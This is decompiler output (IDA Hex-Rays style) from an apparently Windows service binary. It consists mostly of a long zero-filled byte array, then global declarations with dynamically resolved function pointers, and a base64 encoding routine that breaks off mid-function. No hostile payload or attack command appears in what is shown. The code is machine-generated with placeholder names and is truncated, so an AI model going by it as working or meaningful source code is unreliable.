  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // weak
BYTE byte_4931D0[260]; // weak
BYTE Data[260]; // weak
char *dword_4933D8; // idb
CHAR ServiceName[260]; // idb
char Destination[260]; // idb
BYTE ApplicationName; // idb
char FullPath; // idb
CHAR byte_4937EC[260]; // weak
int dword_4938F0; // weak
int dword_4938F4; // weak
int dword_4938F8; // weak
int dword_493900; // weak
int (__stdcall *dword_493904)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_493908)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_49390C)(_DWORD); // weak
int (__stdcall *dword_493910)(_DWORD, _DWORD); // weak
int (__stdcall *dword_493914)(_DWORD, _DWORD); // weak
int dword_493918; // weak
SERVICE_STATUS_HANDLE hServiceStatus; // idb


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, int a2, int a3, int a4)
{
  int v4; // esi
  int v5; // ebx
  char v6; // cl
  int v7; // edi
  int v8; // esi
  int v9; // ebx
  char v10; // al
  int v11; // ebx
  unsigned __int8 v12; // cl
  int v13; // ebx
  char v14; // cl
  int v15; // ebx
  int v16; // ebx
  int v17; // ebx
  unsigned __int8 v18; // cl
  int v19; // ebx
  int v21; // [esp+Ch] [ebp-14h]
  int v22; // [esp+10h] [ebp-10h]
  signed int v23; // [esp+14h] [ebp-Ch]
  int v24; // [esp+18h] [ebp-8h]
  char v25[3]; // [esp+1Ch] [ebp-4h] BYREF
  unsigned __int8 v26; // [esp+1Fh] [ebp-1h]

  v4 = 0;
  v5 = 0;
  v21 = 0;
  v24 = 0;
  v22 = a3;
  while ( v4 < a3 )
  {
    v23 = 3;
    if ( v22 < 3 )
      v23 = v22;
    qmemcpy(v25, "===", sizeof(v25));
    if ( v23 > 0 )
      qmemcpy(v25, (const void *)(a1 + v4), v23);
    v6 = v25[0];
    v26 = (unsigned __int8)v25[0] >> 2;
    if ( v5 )
    {
      v7 = a4;
      if ( a4 <= 0 )
      {
        v8 = a2;
      }
      else
      {
        v8 = a2;
        if ( !((v5 - v24) % a4) )
        {
          *(_BYTE *)(v5 + a2) = 13;
          v9 = v5 + 1;
          *(_BYTE *)(v9 + a2) = 10;
          v5 = v9 + 1;
          v24 += 2;
        }
      }
    }
    else
    {
      v8 = a2;
      v7 = a4;
    }
    *(_BYTE *)(v5 + v8) = *((_BYTE *)off_40F030 + v26);
    v10 = v25[1];
    v11 = v5 + 1;
    v12 = ((unsigned __int8)v25[1] >> 4) + 16 * (v6 & 3);
    if ( v11 && v7 > 0 )
    {
      if ( !((v11 - v24) % v7) )
      {
        *(_BYTE *)(v11 + v8) = 13;
        v13 = v11 + 1;
        *(_BYTE *)(v13 + v8) = 10;
        v11 = v13 + 1;
        v24 += 2;
      }
      v10 = v25[1];
    }
    *(_BYTE *)(v11 + v8) = *((_BYTE *)off_40F030 + v12);
    v14 = v25[2];
